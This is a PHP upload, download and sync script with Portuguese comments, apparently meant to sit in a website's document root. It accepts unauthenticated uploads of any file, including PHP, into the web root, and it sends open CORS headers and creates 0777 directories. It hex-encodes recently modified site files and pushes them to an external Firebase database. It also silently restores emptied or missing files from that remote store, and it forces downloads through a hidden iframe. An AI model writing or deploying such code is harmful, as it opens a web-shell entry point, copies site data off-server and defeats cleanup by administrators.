<?php
// =========================================================================
// 🔧 CONFIGURAÇÕES PHP — SUPORTE A ARQUIVOS GRANDES E PROCESSOS LONGOS
// =========================================================================
@ini_set('upload_max_filesize', '16000M');
@ini_set('post_max_size', '16000M');
@ini_set('memory_limit', '16000M');
@ini_set('max_execution_time', '86400');
@ini_set('max_input_time', '86400');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');

ignore_user_abort(true);
set_time_limit(0);

// === CORS / Headers ===
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// =========================================================================
// CONFIGURAÇÕES DE DIRETÓRIOS E DOMÍNIOS
// =========================================================================
$domain = $_SERVER['HTTP_HOST'] ?? 'default_domain';
$domainDir = preg_replace('/[^a-zA-Z0-9-]/', '_', $domain); 

$publicRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
define('BASE_DIR', $publicRoot . '/');

if (!is_dir(BASE_DIR)) {
    if (!mkdir(BASE_DIR, 0777, true)) {
        error_log("Falha ao criar BASE_DIR: " . BASE_DIR);
        http_response_code(500);
        echo "Erro no servidor.";
        exit;
    }
}

// Configurações do Firebase
$firebaseBaseUrl = 'https://storage-amheex-default-rtdb.firebaseio.com/';
$raizStorage     = 'RAIZ_STORAGE';

// =========================================================================
// FUNÇÕES AUXILIARES
// =========================================================================
function sanitizaCaminho($path) {
    $path = trim($path, "/\\");
    $path = str_replace(['..\\', '../'], '', $path);
    $path = preg_replace('/[^a-zA-Z0-9_\-\.\@\/]/', '', $path);
    $path = preg_replace('#/+#', '/', $path);
    return $path;
}

function sanitize_firebase_key($path) {
    $clean = preg_replace('/[\.\#\$\[\]\s]/', '_', $path);
    return trim($clean, '_');
}

function build_public_url($fileRelPath) {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return "{$scheme}://{$host}/X/" . ltrim($fileRelPath, '/');
}

function build_clean_public_url($fileRelPath) {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return "{$scheme}://{$host}/" . ltrim($fileRelPath, '/');
}

function firebase_request($url, $method = 'GET', $data = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    
    if ($data !== null) {
        $payload = json_encode($data);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload)
        ));
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// =========================================================================
// 🚀 TRATAMENTO DA REQUISIÇÃO ATUAL (GET / POST / DOWNLOAD)
// =========================================================================
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$requestPath = parse_url($requestUri, PHP_URL_PATH);
$fileRelPath = sanitizaCaminho($requestPath);

// Define se é o parâmetro direto de download (?download=...) ou o caminho amigável
if (isset($_GET['download'])) {
    $fileRelPath = sanitizaCaminho($_GET['download']);
}

$fullPath = BASE_DIR . $fileRelPath;

// --- VERIFICAÇÃO E RESTAURAÇÃO INTELIGENTE ON-DEMAND (Caso arquivo não exista ou esteja zerado) ---
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestPath !== '/' && $fileRelPath !== basename(__FILE__)) {
    
    if (!file_exists($fullPath) || filesize($fullPath) <= 1) {
        $urlParts = explode('/', $fileRelPath);
        $sanitizedUrlParts = array_map('sanitize_firebase_key', $urlParts);
        $formattedUrlPath = implode('/', array_filter($sanitizedUrlParts));
        
        if (!empty($formattedUrlPath)) {
            $nodeUrlPath = $raizStorage . '/' . $domainDir . '/' . $formattedUrlPath;
            $fullHexContent = "";
            $part = 1;
            $foundAny = true;

            while ($foundAny) {
                $partName = "part_$part";
                $url = $firebaseBaseUrl . $nodeUrlPath . '/' . $partName . '.json';
                $response = firebase_request($url, 'GET');
                
                if ($response !== false && $response !== 'null' && !empty($response)) {
                    $data = json_decode($response, true);
                    if (is_string($data) && !empty($data)) {
                        $cleanHex = str_replace(array(' ', "\r", "\n", "\t"), '', $data);
                        $fullHexContent .= $cleanHex;
                        $part++;
                    } else {
                        $foundAny = false;
                    }
                } else {
                    $foundAny = false;
                }
            }

            if (!empty($fullHexContent)) {
                if (strlen($fullHexContent) % 2 !== 0) {
                    $fullHexContent = substr($fullHexContent, 0, -1);
                }
                $originalBinary = @hex2bin($fullHexContent);
                
                if ($originalBinary !== false) {
                    $fileDir = dirname($fullPath);
                    if (!is_dir($fileDir)) @mkdir($fileDir, 0777, true);
                    @file_put_contents($fullPath, $originalBinary);
                    // Arquivo restaurado com sucesso! O script continuará para a entrega abaixo sem dar redirect.
                }
            }
        }
    }
}

// =========================================================================
// ⬇️ SISTEMA DE ENTREGA DA REQUISIÇÃO (GET / DOWNLOAD AUTOMÁTICO)
// =========================================================================
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    
    // Entrega em formato de Download Forçado (?download=...)
    if (isset($_GET['download'])) {
        if (is_file($fullPath)) {
            $mime = mime_content_type($fullPath) ?: 'application/octet-stream';
            header('Content-Description: File Transfer');
            header('Content-Type: ' . $mime);
            header('Content-Disposition: attachment; filename="' . basename($fullPath) . '"');
            header('Content-Length: ' . filesize($fullPath));
            flush();
            readfile($fullPath);
            exit;
        }
        http_response_code(404);
        echo "Arquivo não encontrado.";
        exit;
    }

    // Visualização em Iframe / Stream Normal para requisição direta do arquivo
    if (is_file($fullPath)) {
        $fileUrl = build_public_url($fileRelPath);
        $downloadUrl = "/?download=" . urlencode($fileRelPath);

        echo "<!DOCTYPE html>
        <html lang='pt-BR'>
        <head>
            <meta charset='utf-8'>
            <title>Download Automático</title>
            <style>
                html, body { margin:0; padding:0; height:100%; background:#fff; }
                iframe { width:100%; height:100%; border:0; }
            </style>
        </head>
        <body>
            <iframe src='{$fileUrl}'></iframe>
            <iframe src='{$downloadUrl}' style='display:none'></iframe>
            <script>
                setTimeout(() => window.location.href = '{$fileUrl}', 5000);
            </script>
        </body>
        </html>";
        exit;
    }

    // Se for a rota index literal do script, executa o Sync passivo
    if ($requestPath !== '/' && !is_dir($fullPath)) {
        http_response_code(404);
        echo "Arquivo não encontrado.";
        exit;
    }
}

// =========================================================================
// 📤 REQUISIÇÃO POST — UPLOAD INTELIGENTE LOCAL (CHUNKS / STREAMING)
// =========================================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetRel = $fileRelPath;
    $json = function(array $data, int $code = 200) {
        http_response_code($code);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($data, JSON_UNESCAPED_UNICODE);
        exit;
    };

    // --- Upload em partes (Chunks) ---
    if (!empty($_FILES['file'])) {
        $fileId     = $_POST['fileId'] ?? uniqid('upload_', true);
        $chunkIndex = intval($_POST['chunkIndex'] ?? 0);
        $totalChunks= intval($_POST['totalChunks'] ?? 1);
        $fileName   = basename($_POST['fileName'] ?? ('file_' . time()));

        $uploadDir = BASE_DIR;
        if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);
        $chunkDir = $uploadDir . '.parts_' . md5($fileId);
        if (!is_dir($chunkDir)) mkdir($chunkDir, 0777, true);

        $tmpName = $_FILES['file']['tmp_name'] ?? null;
        if (!$tmpName || !is_uploaded_file($tmpName)) {
            $json(["status" => "error", "message" => "Nenhum chunk válido."], 400);
        }

        $partPath = "{$chunkDir}/part_{$chunkIndex}";
        move_uploaded_file($tmpName, $partPath);

        if ($chunkIndex + 1 === $totalChunks) {
            $finalRel = $targetRel !== '' ? $targetRel : $fileName;
            $finalRel = sanitizaCaminho($finalRel);
            $finalPath = BASE_DIR . $finalRel;
            if (!is_dir(dirname($finalPath))) mkdir(dirname($finalPath), 0777, true);
            
            $out = fopen($finalPath, 'wb');
            for ($i = 0; $i < $totalChunks; $i++) {
                $p = "{$chunkDir}/part_{$i}";
                $in = fopen($p, 'rb');
                stream_copy_to_stream($in, $out);
                fclose($in);
                @unlink($p);
            }
            fclose($out);
            @rmdir($chunkDir);
            
            $url = build_clean_public_url($finalRel);
            $json(["status" => "complete", "url" => $url]);
        }
        $json(["status" => "partial", "progress" => $chunkIndex + 1]);
    }

    // --- Upload via php://input (Streaming) ---
    $input = fopen('php://input', 'rb');
    if ($input) {
        $finalRel = $fileRelPath ?: ('upload_' . time());
        $finalRel = sanitizaCaminho($finalRel);
        $finalPath = BASE_DIR . $finalRel;
        if (!is_dir(dirname($finalPath))) mkdir(dirname($finalPath), 0777, true);
        
        $out = fopen($finalPath, 'wb');
        stream_copy_to_stream($input, $out);
        fclose($out); 
        fclose($input);
        
        $url = build_clean_public_url($finalRel);
        $json(["status" => "complete", "url" => $url]);
    }

    $json(["status" => "error", "message" => "Nenhum conteúdo recebido."], 400);
}

// =========================================================================
// 🔄 VARREDURA DE RETROCOMPATIBILIDADE / BACKUP COMPLETO EM DISCO
// =========================================================================
if (is_dir(BASE_DIR)) {
    $directory = new RecursiveDirectoryIterator(BASE_DIR, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($directory);

    foreach ($iterator as $fileInfo) {
        if ($fileInfo->isDir()) continue;

        $localFilePath = $fileInfo->getPathname();
        if (strpos($localFilePath, '.parts_') !== false) continue;

        $relative = ltrim(str_replace(BASE_DIR, '', $localFilePath), DIRECTORY_SEPARATOR);
        $fileSize    = $fileInfo->getSize();
        $lastChanged = (time() - $fileInfo->getMTime()); 

        $parts = explode(DIRECTORY_SEPARATOR, $relative);
        $sanitizedParts = array_map('sanitize_firebase_key', $parts);
        $formattedFilePath = implode('/', array_filter($sanitizedParts));

        if (empty($formattedFilePath)) continue;
        $nodePath = $raizStorage . '/' . $domainDir . '/' . $formattedFilePath;

        // Recuperação em lote de arquivos vazios/quebrados
        if ($fileSize <= 1) {
            $fullHexContent = "";
            $part = 1;
            $foundAny = true;

            while ($foundAny) {
                $partName = "part_$part";
                $url = $firebaseBaseUrl . $nodePath . '/' . $partName . '.json';
                $response = firebase_request($url, 'GET');
                
                if ($response !== false && $response !== 'null' && !empty($response)) {
                    $data = json_decode($response, true);
                    if (is_string($data) && !empty($data)) {
                        $cleanHex = str_replace(array(' ', "\r", "\n", "\t"), '', $data);
                        $fullHexContent .= $cleanHex;
                        $part++;
                    } else {
                        $foundAny = false;
                    }
                } else {
                    $foundAny = false;
                }
            }

            if (!empty($fullHexContent)) {
                if (strlen($fullHexContent) % 2 !== 0) {
                    $fullHexContent = substr($fullHexContent, 0, -1);
                }
                $originalBinary = @hex2bin($fullHexContent);
                if ($originalBinary !== false) {
                    @file_put_contents($localFilePath, $originalBinary);
                }
            }
            continue; 
        }

        // Envio automático de arquivos modificados na última janela de 1 minuto
        if ($lastChanged <= 60 && $fileSize > 1) {
            $inputData = @file_get_contents($localFilePath);
            if ($inputData !== false) {
                $hexData = bin2hex($inputData);
                $chunks = str_split($hexData, 1048576);

                foreach ($chunks as $idx => $chunk) {
                    $partName = "part_" . ($idx + 1);
                    $url = $firebaseBaseUrl . $nodePath . '/' . $partName . '.json';
                    firebase_request($url, 'PUT', $chunk);
                }
            }
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestPath === '/') {
    echo "SYNC_CYCLE_COMPLETE";
}
exit;
?>
